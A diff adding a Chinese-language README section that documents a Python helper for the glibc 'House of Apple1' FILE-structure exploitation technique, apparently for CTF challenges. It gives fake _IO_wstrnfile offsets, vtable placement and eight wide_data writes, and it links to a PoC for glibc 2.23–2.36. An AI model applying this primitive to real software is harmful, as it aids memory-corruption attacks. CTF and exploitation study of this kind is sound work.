@@ -56,6 +56,120 @@ _IO_wsetb(fp, snf->overflow_buf, snf->overflow_buf + 64, 0);
 
 fake `_IO_wstrnfile` 的完整字段关系和写入结果位于 C 文件末尾的“题目布局伪代码”，无需额外生成二进制布局文件。
 
+## Python 离线板子
+
+[`apple1.py`](./apple1.py) 提供 `build_house_of_apple1`，生成 Apple1 最终消费点所需的 fake FILE 和八个已知值写入。
+
+### 函数用途
+
+模拟 `_IO_wstrn_overflow` 的写入结果。触发 `__overflow(fp, L'A')` 后，`_IO_wstrn_overflow` 把 `fake_file + 0xf0` 的地址写入 fake `_IO_wide_data` 的多个字段。
+
+### 对应 PoC
+
+- [`poc_known_write_2.23_2.36.c`](./poc_known_write_2.23_2.36.c)。
+
+### x86-64 `_IO_wstrnfile` 布局
+
+```text
++0x000  FILE 主结构
++0x0d8  主 vtable
++0x0e0  兼容字段 1
++0x0e8  兼容字段 2
++0x0f0  overflow_buf（宽字符缓冲区）
+```
+
+`overflow_buf` 地址 `known = fake_file_addr + 0xf0` 是八个写入的共同来源。
+
+### 最小使用示例
+
+```python
+from apple1 import build_house_of_apple1
+
+# 占位地址：题目中换成已泄露/计算后的地址
+writes = build_house_of_apple1(
+    fake_file_addr=0x100000,     # fake _IO_wstrnfile
+    wide_data_addr=0x200000,     # 被写入的 fake wide_data
+    wstrn_jumps_addr=0x7fff0000, # 按 Build ID 解析的 _IO_wstrn_jumps
+)
+
+# 返回两个 MemoryWrite
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+
+# writes[0] 是 fake FILE 镜像，writes[1] 是 wide_data 八个已知值写入
+```
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `fake_file_addr` | fake `_IO_wstrnfile` 起点；`overflow_buf` 按 `+0xf0` 计算。 |
+| `wide_data_addr` | 要被写入的 fake `_IO_wide_data` 地址。 |
+| `wstrn_jumps_addr` | 目标 libc 的 `_IO_wstrn_jumps` 地址，写入 `FILE+0xd8`；必须按 Build ID 解析，不能默认套用 `_IO_wfile_jumps - 0x300`。 |
+| `file_mode` | FILE `_mode`，默认 1；PoC 用它保持宽字符路径。 |
+
+### 返回对象
+
+返回两个 `MemoryWrite`。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各写入内容：
+
+```text
+1. address: fake_file_addr
+   data:    0xe0 字节 fake FILE 镜像
+   label:   "fake _IO_wstrnfile"
+
+2. address: wide_data_addr
+   data:    0x40 字节 fake wide_data
+   label:   "Apple1 wide_data known writes"
+```
+
+fake FILE 关键字段：
+
+```text
++0xa0  _wide_data = wide_data_addr
++0xc0  _mode = file_mode
++0xd8  vtable = wstrn_jumps_addr
+```
+
+wide_data 的八个写入：
+
+| 偏移 | 字段 | 值 |
+|---|---|---|
+| +0x00 | `_IO_read_ptr` | `known` |
+| +0x08 | `_IO_read_end` | `known + 0x100` |
+| +0x10 | `_IO_read_base` | `known` |
+| +0x18 | `_IO_write_base` | `known` |
+| +0x20 | `_IO_write_ptr` | `known` |
+| +0x28 | `_IO_write_end` | `known` |
+| +0x30 | `_IO_buf_base` | `known` |
+| +0x38 | `_IO_buf_end` | `known + 0x100` |
+
+`known + 0x100` 来自 `wchar_t overflow_buf[64]`。
+
+### 调用者必须提供
+
+```text
+libc 基址和 _IO_wstrn_jumps 地址
+可写 fake _IO_wide_data
+能触发 __overflow 的宽字符路径
+2.24+ 的合法 primary vtable（即 wstrn_jumps 本身）
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 挂到 _IO_list_all
+不触发 __overflow
+不负责恢复 flush/exit 所需的 _IO_write_base/_IO_write_ptr 等筛选字段
+```
+
 C PoC 为了跨发行版运行，使用上游 x86-64 本范围内 `_IO_wstrn_jumps = _IO_wfile_jumps - 0x300` 的关系；迁移到题目时必须从附件 libc 的隐藏 symbol/反汇编重新取偏移。
 
 ## 迁移与调试
